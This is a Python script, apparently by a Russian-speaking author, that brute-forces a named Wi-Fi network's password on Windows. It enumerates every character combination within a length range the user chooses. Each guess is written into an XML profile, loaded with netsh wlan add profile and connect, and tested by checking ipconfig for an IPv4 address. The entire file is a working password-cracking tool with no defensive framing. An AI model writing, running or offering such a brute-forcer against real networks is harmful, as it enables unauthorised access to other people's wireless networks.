from string import digits, punctuation, ascii_letters

##############################################
def perebor_paste(password):
    Sf1 = open('SSID1.xml', 'rt')
    SSID_file1 = Sf1.read()
    text22 = SSID_file1.replace('parol', password)
    #Sf1.close()

    f1 = open('SSID2.xml', 'w')# идёт сохраниение нового пароля и уничтожение старого, каждый раз
    f1.write(text22)
    #f1.close()
#############################################3
def test_password(ssid_vzl):
    aloha = False
    subprocess.call(r'netsh wlan add profile filename="C:\Users\Admin\Documents\Python\vzlom_wifi\SSID2.xml"')
    subprocess.call(f'netsh wlan connect name={ssid_vzl}')
    time.sleep(0.05)
    itr = subprocess.check_output("ipconfig", shell=False)
    d_itr = itr.decode('cp866')
    if d_itr.find('IPv4')>0:# проверяет появился или нет шлюз, есть или нет подключение
        aloha = True
        print('Pass true')
        
    
    return aloha

##############################################
import subprocess, time
def bruttter():

    ssid_vzl = input('Введите в точности название вай фай сети для взлома: ')

    Sf = open('SSID.xml', 'rt')# Эталон, чтоб можно было с него начинать каждый раз.
    SSID_file = Sf.read()
    text2 = SSID_file.replace('limur', ssid_vzl)
    Sf.close()

    f = open('SSID1.xml', 'w')# этот документ создаётся из эталона только раз в самом начале программы, заводит имя сети
    f.write(text2)
    f.close()

######################################
    try:
        password_length = input('Какой длины пароль, например, 8-10 : ')
        password_length = [int(item) for item in password_length.split('-')]
    except:
        print('Что то пошло не так. Проверьте введённые данные!!!')
    
    print('Какие символы содержатся в пароле?')
    print('Цифры, введите 1')
    print('Буквы, введите 2')
    print('Спец.символы, введите 3')
    print('Цифры и буквы, введите 4')
    print('Цифры и спец.символы, введите 5')
    print('Буквы и спец.символы, введите 6')
    print('Цифры и буквы и спец.символы, введите 7')

    try:
        choice = int(input('Выбор: '))
        if choice == 1:
            possible_symbols = digits
        elif choice == 2:
            possible_symbols = ascii_letters
        elif choice == 3:
            possible_symbols = punctuation
        elif choice == 4:
            possible_symbols = digits + ascii_letters
        elif choice == 5:
            possible_symbols = digits + punctuation
        elif choice == 6:
            possible_symbols = ascii_letters + punctuation
        elif choice == 7:
            possible_symbols = ascii_letters + digits + punctuation
    except:
        print('Ты где то не там свернул')
    
    import itertools
    import keyboard as keyb
    subprocess.call('wmic process where name="Code.exe" CALL setpriority 256')
    subprocess.call('wmic process where name="cmd.exe" CALL setpriority 256')
    t = time.time()
    c_bruter = False
    for password_length in range(password_length[0], password_length[1] + 1):
        
        for password in itertools.product(possible_symbols, repeat=password_length):
            password = ''.join(password)
            print(password)
            perebor_paste(password)# отправляет пароль на замену в файл ssid2
            if keyb.is_pressed('esc'):
                c_bruter = True
                print('Процесс прерван')
                break
            elif test_password(ssid_vzl) == True:# проверяет попал пароль или нет
                c_bruter = True
                print('Время: ', time.time() - t)
                print('Пароль от сети ', ssid_vzl, ' : ', password)
                break
            
        if c_bruter == True:
            break
                   

bruttter()
